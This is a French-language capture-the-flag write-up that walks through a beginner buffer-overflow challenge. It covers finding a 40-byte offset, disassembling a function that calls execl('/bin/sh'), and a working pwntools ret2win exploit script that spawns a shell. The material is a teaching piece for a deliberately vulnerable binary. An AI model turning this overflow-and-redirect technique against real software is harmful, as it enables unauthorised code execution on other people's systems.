---
title: "HTB Write-up Cyber Apocalypse CTF 2026 - Pwn : RINg The Bell"
date: 2026-07-29
categories: [binary exploit, pwn]
tags: [binary exploitation, gdb, linux, elf, pwn]
image:
  path: /assets/img/htb/ring_the_bell/Cyber_Apocalypse_CTF_2026_The_Salt_Crown_PWN.png
---


## Contexte
> - Nom: RING The Bell
> - Type: Pwn
> - Niveau: Very Easy

Il s'agit là du premier challenge de PWN du CTF (Capture The Flag) HackTheBox Cyber Apocalypse CTF 2026.
Nous allons profiter de ce challenge pour explorer les bases de l'exploitation de binaire et aborder les concepts fondamentaux.


## Reconnaissance
Même si le challenge est relativement simple en soit, sa faible complexité nous permettra de prendre en main certains outils et d'adopter quelques automatismes.

### exiftool
Nous allons commencer avec la commande `exiftool`, qui va nous permettre de récupérer des informations pertinentes sur notre fichier.

**lancement de exiftool**
```bash
exiftool ring_the_bell
```

Effectivement nous avons quelques informations pertinentes.

**output exiftool**
```bash
ExifTool Version Number         : 12.57
File Name                       : ring_the_bell
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2026:07:24 15:24:44+02:00
File Access Date/Time           : 2026:07:25 18:45:12+02:00
File Inode Change Date/Time     : 2026:07:24 15:25:02+02:00
File Permissions                : -rwxrwxrwx
File Type                       : ELF executable
File Type Extension             :
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
```

Nous avons bien la confirmation que nous avons affaire à un exécutable `Linux` (ELF) en 64 bit.

Lançons-le pour voir ce qu'il retourne !

### Analyse dynamique
Nous allons exécuter ce binaire pour voir :
- ce qu'il fait
- ce qu'il attend comme entrée utilisateur
- les différentes chaînes de caractères présentes dans le programme

**Exécution de ring_the_bell**
```bash
./ring_the_bell
```

Apparemment, il s'agit d'un programme qui nous demande une entrée utilisateur simplement.
![Execution de ring_the_bell](/assets/img/htb/ring_the_bell/first_run.png)
_Exécution de ring_the_bell_

Nous pouvons renseigner un input et valider pour voir ce qu'il se passe, mais rien de très pertinent. Le programme se termine simplement.

![Premier input dans de ring_the_bell](/assets/img/htb/ring_the_bell/first_input.png)
_Premier inuput dans le programme_


### Provoquer un crash

Nous savons que nous sommes sur un challenge de `binary exploitation`, donc par supposition nous nous attendons à une vulnérabilité de type `Buffer Overflow`, nous allons donc essayer d'envoyer dans l'input pour confirmer cela.

> Pour vérifier si cette vulnérabilité est présente, nous allons donc essayer d'envoyer dans l'input une entrée volontairement beaucoup trop longue par rapport à ce qui est normalement attendu. Si le programme crash (segfault) suite à cet envoi, cela confirme qu'il n'y a pas de contrôle sur la taille de l'entrée, et donc que la vulnérabilité de type Buffer Overflow est bien exploitable.

#### Génération de la chaîne de caractère

Pour commencer, nous allons générer une chaîne de caractère d'une longueur de 150. Nous allons la générer avec python.
Nous allons générer une chaîne contenant `150 fois` le caractère `A`.

**Génération de la chaîne de caractère**
```bash
python3 -c "print('A'*150)"
```

Ce qui nous renvoie naturellement :
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

#### Crash du programme

Maintenant que nous avons notre chaîne, nous allons l'injecter dans notre input du programme `ring_the_bell`.

**Exécution de ring_the_bell**
```bash
./ring_the_bell
```

Et ajouter nos 150 `A`.

![Insertion de 150 A dans l'input du programme](/assets/img/htb/ring_the_bell/insert_150_a.png)
_Insertion de 150 A dans l'input du programme_

Et si nous validons nous pouvons constater que le programme à planté avec l'erreur suivante :

![Crash du programme](/assets/img/htb/ring_the_bell/first_crash.png)
_Crash du programmee_

Cela confirme qu'il n'y a pas de contrôle sur la taille de l'entrée, et donc que la vulnérabilité de type Buffer Overflow est bien exploitable.


Avant d'aller plus loin, nous allons essayer de comprendre ce qu'il vient de se produire.

#### La stack

La stack fonctionne selon le principe LIFO (*Last In, First Out*) : la dernière donnée empilée est la première dépilée. Sur la plupart des architectures (x86, x86_64), elle croît vers les adresses basses : chaque nouvel élément empilé est placé à une adresse inférieure à celle du précédent.

Chaque appel de fonction crée sur la stack un **stack frame** (ou cadre de pile), c'est-à-dire une zone mémoire dédiée à cette fonction, contenant ses variables locales, l'adresse de retour vers l'appelant, et le pointeur de base sauvegardé de la fonction appelante.

Deux registres délimitent ce frame :
- **RBP (Base Pointer)** : pointe vers le début du frame courant, et sert de référence fixe pour accéder aux variables locales et aux paramètres.
- **RSP (Stack Pointer)** : pointe vers le sommet de la stack, c'est-à-dire la dernière adresse utilisée. Il évolue au fur et à mesure que des données sont empilées ou dépilées.

Lorsqu'une fonction est appelée, plusieurs éléments sont empilés dans cet ordre :
1. Les arguments de la fonction (selon la convention d'appel)
2. L'adresse de retour (**Return Address**), qui indique où reprendre l'exécution une fois la fonction terminée
3. L'ancien base pointer (**Saved RBP**), sauvegardé pour restaurer le contexte de la fonction appelante
4. Les variables locales de la fonction

![Schéma de la stack](/assets/img/htb/ring_the_bell/first_stack_scema.png)
_Schéma de la stack_


#### Buffer Overflow

Prenons l'exemple d'une fonction qui utilise un buffer local :

```c
void vuln() {
    char buffer[64];
    gets(buffer);
}
```

Ici, la variable `buffer` est stockée dans le stack frame de `vuln()`. Lorsque le programme récupère l'entrée utilisateur, les données sont copiées dans cet espace mémoire.

Le problème apparaît lorsque la taille de l'entrée utilisateur dépasse la taille prévue du buffer. Si le programme ne vérifie pas la longueur des données reçues, les octets supplémentaires vont continuer à être écrits en mémoire après la fin du buffer.

Bien que la stack grandisse vers les adresses basses, l'écriture à l'intérieur d'un buffer se fait dans le sens inverse : du début du buffer vers les adresses hautes. Cette différence est essentielle : elle signifie qu'un débordement de buffer ne va pas écraser une zone mémoire arbitraire, mais va spécifiquement écraser, dans l'ordre, le **Saved RBP** puis le **Return Address** — les deux éléments stockés juste au-dessus du buffer dans le stack frame.

C'est cette caractéristique qui rend le Return Address particulièrement intéressant pour un attaquant : en contrôlant précisément son contenu, il devient possible de rediriger le flux d'exécution du programme vers une adresse arbitraire.

La stack peut alors ressembler à ceci :
![Schéma de la stack avant après buffer overflow](/assets/img/htb/ring_the_bell/stack_frame_overflow_avant_apres.png)
_Schéma de la stack avant après buffer overflow_

#### Objectif

Vous l'aurez compris, le but désormais est de contrôler la valeur de l'adresse de retour (Return Address), et d'y insérer la nôtre afin d'indiquer au programme quelle instruction exécuter une fois la fonction `vuln()` terminée.

Pour cela, il nous faut d'abord déterminer précisément **à quel octet de notre entrée** le Return Address commence à être écrasé. C'est ce qu'on appelle l'**offset**.

### Calcul de l'offset

#### Fonctionnement

Pour savoir précisément combien d'octets sont nécessaires pour atteindre puis écraser le Return Address, nous devons connaître l'**offset** exact entre le début de notre `buffer` et le Return Address dans le stack frame.

Une méthode naïve serait d'envoyer une chaîne de "A" et d'augmenter progressivement sa taille jusqu'à voir RIP contenir `0x4141414141414141` — mais ce serait long et peu précis. À la place, nous allons utiliser le script `pattern_create.rb` de Metasploit.

Ce script génère une chaîne de la taille souhaitée, mais contrairement à une chaîne de "A" répétées, chaque **groupe de 4 (ou 8) caractères** de cette chaîne est **unique** dans toute la séquence (par exemple `Aa0Aa1Aa2Aa3...`). Cette propriété est essentielle : là où une chaîne de "A" ne permet pas de savoir *à quelle distance* du début se trouve un "A" donné (ils sont tous identiques), une séquence de caractères unique permet de repérer précisément *où* dans la chaîne se situe une valeur donnée.

Concrètement, le principe se déroule en deux temps :

1. **Génération et envoi du pattern** : on génère une chaîne (par exemple de 150 octets) avec `pattern_create.rb`, et on l'envoie en entrée du programme, exactement comme on l'a fait avec nos 150 "A".

2. **Lecture de la valeur qui écrase RIP** : le programme crash toujours de la même manière, mais cette fois, la valeur qui se retrouve dans le registre RIP (visible dans GDB au moment du crash) n'est plus `0x4141414141414141` — c'est un fragment unique du pattern, par exemple `0x6141396141386141`.

Comme ce fragment de 8 octets n'apparaît qu'à un seul endroit dans toute la chaîne générée, on peut utiliser le script complémentaire `pattern_offset.rb` (toujours fourni par Metasploit) pour rechercher cette valeur précise dans le pattern d'origine, et obtenir en retour sa position exacte — c'est-à-dire l'offset.

Cet offset correspond donc au nombre exact d'octets à envoyer avant de pouvoir écrire nous-mêmes, librement, la valeur du Return Address.


#### Calcul de l'offset sur notre programme

Nous allons commencer par générer une chaîne de 150 octets avec `pattern_create.rb`

**Génération de la chaîne de 150 octets**
```shell
$ /opt/tools/metasploit-framework/tools/exploit/pattern_create.rb -l 150
```

Cela nous retourne la chaîne suivante

**résultat**
```shell
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Maintenant lancons de nouveau notre programme mais cette fois-ci en mode debug avec `GDB`, pour pouvoir analyser ce qu'il se passe en mémoire !

**Exécution de ring_the_bell avec gdb**
```bash
$ gdb ring_the_bell
```

Nous nous retrouvons donc dans l'invite de commande de `gdb` (le programme `ring_the_bell` n'est pas encore lancé)

![Lancement du programme en mode debug](/assets/img/htb/ring_the_bell/gdb_first_run.png)
_Lancement du programme en mode debug_

C'est ici que nous allons pouvoir configurer nos `breakpoint`, lister nos `fonctions` etc, avant de lancer notre programme.

Nous allons commencer par lister nos fonctions

```bash
pwndbg> info functions
```

Nous pouvons constater 3 fonctions intéressante :
- `main` : la fonction principale du programme
- `success` : une fonction qui doit probablement afficher un message
- `bell` : vu le nom du challenge `Ring The Bell`, surêment la fonction à atteindre


![Liste des fonctions](/assets/img/htb/ring_the_bell/functions_list.png)
_Liste des fonctions_

Nous allons lancer l'execution de notre programme avec `run`

**Lancement du programme depuis gdb**
```shell
pwndbg> run
```

Maintenant que notre programme est lancé, et que l'entrée utilisateur est attendu nous pouvons y entrer la chaîne de caractère généré par  `pattern_create.rb`

**Insertion de 150 caractères dans l'input**
![Insertion de la chaîne](/assets/img/htb/ring_the_bell/insert_overflow.png)
_Insertion de la chaîne_

Et voilà notre programme a bien crashé, mais avant de fermer le processus, `gdb` nous montre l'état de la mémoire pour que nous puissions analyser son contenu

![Crash du programme sous gdb](/assets/img/htb/ring_the_bell/crash_gdb.png)
_Crash du programme sous gdb_

Nous pouvons constater 2 section : 
- **1** - l'état de la `stack`, nous pouvons voir que notre chaîne de caractère a totalement écrite sur cette dernière
- **2** - l'adresse de retour (Return Address), a elle aussi été modifiée

La Return Address, a donc désormais pour valeur `0x3562413462413362` 

Maintenant que la `Return Address` contient la valeur hexadecimal d'un extrait du patern généré par `pattern_offset.rb`, nous allons prendre cette valeur et la donner au programme `pattern_offset.rb`, pour savoir à quel moment nous trouvons ce pattern et donc à partir de là déterminer la valeur la taille de l'offset donc de du buffer.


**calcul de l'offset**
```bash
$ /opt/tools/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3562413462413362
[*] Exact match at offset 40
```

Ce qui nous retourne `40` ! Donc notre offset est de 40


### Analyse de la fonction bell

Maintenant que nous connaissons notre offset, nous savons qu'il faut **40 octets** avant de pouvoir atteindre la **Return Address**.
Théoriquement, notre payload devrait avoir cette forme :

```python
40 * 'A' + <Adresse où nous voulons sauter>
```

Développons :
-   **`40 * 'A'`** → nous devons remplir le `buffer` de `40` octets, nous allons donc le bourrer avec `40` fois le caractère `A`.
-   **`<Adresse où nous voulons sauter>`** → l'adresse de la fonction vers laquelle nous voulons rediriger le flux d'exécution de notre programme.

> Reste maintenant à savoir : **où sauter ?**

En listant les fonctions du binaire, on repère une fonction qui sort du lot : `bell`. Son nom, en cohérence avec celui du binaire (`ring_the_bell`), laisse penser qu'il s'agit potentiellement de notre cible. Regardons ce qu'elle fait concrètement.

#### Détail de la fonction bell

Plus haut, nous avons noté 3 fonctions intéressantes :
- `bell`
- `main`
- `success`

Nous pensons que la fonction `bell` est la fonction qui nous permet potentiellement de réussir le challenge.
Mais concrètement, que fait-elle ?

Nous allons utiliser l'outil `objdump` pour transformer la fonction en instructions assembleur afin de décortiquer son fonctionnement.

**Désassemblage de la fonction bell**
```bash
$ objdump -M intel -d ring_the_bell --disassemble=bell
```

**Résultat**
```asm
000000000040176d <bell>:
  40176d:       f3 0f 1e fa             endbr64
  401771:       55                      push   rbp
  401772:       48 89 e5                mov    rbp,rsp
  401775:       ba 00 00 00 00          mov    edx,0x0
  40177a:       48 8d 05 de 08 00 00    lea    rax,[rip+0x8de]        # 40205f <_IO_stdin_used+0x5f>
  401781:       48 89 c6                mov    rsi,rax
  401784:       48 8d 05 d7 08 00 00    lea    rax,[rip+0x8d7]        # 402062 <_IO_stdin_used+0x62>
  40178b:       48 89 c7                mov    rdi,rax
  40178e:       b8 00 00 00 00          mov    eax,0x0
  401793:       e8 f8 f9 ff ff          call   401190 <execl@plt>
  401798:       90                      nop
  401799:       5d                      pop    rbp
  40179a:       c3                      ret
```

##### Analyse de l'assembleur

Décortiquons ces instructions une par une :
-   `endbr64` → instruction de protection (Control-Flow Enforcement Technology), elle marque une destination valide pour un saut/appel indirect. Elle n'a pas d'impact sur la logique du programme.
-   `push rbp` / `mov rbp,rsp` → prologue standard de fonction, sauvegarde le frame pointer de l'appelant.
-   `mov edx,0x0` → place `0` dans `edx`, qui correspondra au **3ᵉ argument** de l'appel de fonction à venir.
-   `lea rax,[rip+0x8de]` puis `mov rsi,rax` → charge une adresse mémoire (`0x40205f`) dans `rsi`, qui correspondra au **2ᵉ argument**.
-   `lea rax,[rip+0x8d7]` puis `mov rdi,rax` → charge une autre adresse mémoire (`0x402062`) dans `rdi`, qui correspondra au **1ᵉʳ argument**.
-   `mov eax,0x0` → convention d'appel System V AMD64 : pour une fonction variadique (comme `execl`), `eax` doit contenir le nombre de registres vectoriels (XMM) utilisés, ici `0`.
-   `call 401190 <execl@plt>` → appelle la fonction `execl` de la libc.

On reconnaît ici la signature de la fonction `execl` :
```c
int execl(const char *path, const char *arg, ..., NULL);
```

Avec nos registres, cela donne :

```c
execl(rdi, rsi, rdx);
// soit
execl(0x402062, 0x40205f, NULL);
```

**Le problème**

Le désassemblage nous montre la logique du code, mais pas les données qu'il manipule. Les valeurs `0x402062` et `0x40205f` ne sont que des adresses mémoire. 

Pour savoir ce qu'`execl` exécute réellement, il faut aller voir ce qu'il y a **à ces adresses**.

Ces adresses tombent dans la section `.rodata` (*Read-Only Data*), la section d'un binaire où sont stockées les constantes en lecture seule, notamment les chaînes de caractères littérales du code source. C'est exactement ce qu'on attend ici, puisque `execl` prend des chaînes de caractères en argument.

**Dump de la section `.rodata`**


```bash
$ objdump -s -j .rodata ring_the_bell
```

```c
 402050 001b5b32 4a001b5b 25643b25 64480073  ..[2J..[%d;%dH.s
 402060 68002f62 696e2f73 68000000 00000000  h./bin/sh.......
```

En regardant précisément les offsets qui nous intéressent :
-   à `0x40205f` → `73 68 00` → `"sh"`
-   à `0x402062` → `2f 62 69 6e 2f 73 68 00` → `"/bin/sh"`

**Conclusion**

La fonction `bell` exécute donc :

```c
execl("/bin/sh", "sh", NULL);
```

Autrement dit, elle **spawn un shell**. C'est bien notre fonction "win" : si nous parvenons à rediriger le flux d'exécution du programme vers l'adresse `0x40176d` (le début de `bell`), le programme nous donnera un shell.

Notre payload final aura donc cette forme :



```python
40 * b'A' + p64(0x40176d)
```

### Exploitation

Maintenant que nous connaissons l'offset (`40` octets) et l'adresse de notre fonction "win" (`bell` à `0x40176d`), nous pouvons automatiser l'exploit avec `pwntools`.

**exploit.py**
```python
from pwn import *

context.arch = 'amd64'
target = './ring_the_bell'
elf = ELF(target)

offset = 40
bell_addr = elf.symbols['bell']  # 0x40176d

payload = b'A' * offset + p64(bell_addr)

p = process(target)  # ou p = remote('IP', PORT) pour le serveur distant
p.sendline(payload)

p.interactive()
```

### Détail du script

- **`context.arch = 'amd64'`** → indique à `pwntools` que nous travaillons sur une architecture 64 bits. Cela influence notamment le comportement de fonctions comme `p64()`, qui encode une adresse sur 8 octets en little-endian, conformément à la convention x86-64.

- **`elf = ELF(target)`** → charge le binaire `ring_the_bell` et parse sa table de symboles automatiquement. Cela nous évite de coder en dur l'adresse de `bell` : `pwntools` va la retrouver toute seule.

- **`bell_addr = elf.symbols['bell']`** → récupère directement l'adresse de la fonction `bell` (`0x40176d`) depuis la table de symboles du binaire, plutôt que de la copier-coller manuellement depuis `objdump`. C'est plus robuste : si le binaire est recompilé et que l'adresse change, le script s'adapte automatiquement.

- **`payload = b'A' * offset + p64(bell_addr)`** → construit notre payload final :
  - `b'A' * offset` remplit les 40 octets nécessaires pour atteindre la `Return Address`,
  - `p64(bell_addr)` écrase ensuite cette `Return Address` avec l'adresse de `bell`, encodée sur 8 octets en little-endian.

- **`p = process(target)`** → lance une instance locale du binaire pour tester l'exploit. Face au serveur distant du challenge, on remplacerait cette ligne par `p = remote('IP', PORT)`, en utilisant l'IP et le port fournis.

- **`p.sendline(payload)`** → envoie notre payload au programme, qui va lire notre entrée dans le buffer vulnérable, provoquer l'overflow, et écraser la `Return Address` avec l'adresse de `bell`.

- **`p.interactive()`** → une fois le shell obtenu (grâce à `execl("/bin/sh", "sh", NULL)` exécuté dans `bell`), cette ligne bascule `pwntools` en mode interactif, nous permettant d'utiliser le shell comme si nous étions directement dans un terminal.

#### Résultat attendu

Lorsque le programme atteint son `ret`, il ne retourne pas vers son appelant légitime, mais saute directement dans `bell`. Celle-ci exécute `execl("/bin/sh", "sh", NULL)`, ce qui nous donne un shell interactif ! 

Testons !

### Exploitation

Si nous lancons notre script
```bash
$ python3 exploit.py
```

Nous pouvons voir que nous avons bien redirigé le flux vers la fonction `bell` en obtenant un shell !

![Exploitation !](/assets/img/htb/ring_the_bell/exploit.png)
_Exploitation !_

